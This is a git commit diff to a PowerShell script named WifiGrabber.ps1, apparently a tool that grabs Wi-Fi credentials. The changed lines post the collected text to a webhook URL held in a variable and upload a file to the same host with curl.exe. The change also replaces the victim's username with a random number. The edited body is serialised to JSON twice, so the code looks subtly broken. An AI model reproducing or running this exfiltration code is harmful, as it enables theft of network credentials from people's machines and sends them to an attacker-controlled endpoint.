bb25b5d1d0bdecf44c049e1f0e7fc43185b43dc7
Cronix <98478052+Cronix2@users.noreply.github.com>
2024-02-25 20:34:50 +0100

    Update WifiGrabber.ps1

--- WifiGrabber.ps1
+++ WifiGrabber.ps1
@@ -59,12 +59,12 @@ $username = Get-Random -Minimum 10000 -Maximum 99999
 $hookurl = "$dc"
 
 $Body = @{
-  'username' = $env:username
-  'content' = $text
-}
+  "username" = $username
+  "content" = $text
+} | ConvertTo-Json
 
 if (-not ([string]::IsNullOrEmpty($text))){
-Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Headers $username -Body ($Body | ConvertTo-Json)};
+Invoke-RestMethod -ContentType 'application/json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
 
 if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 }
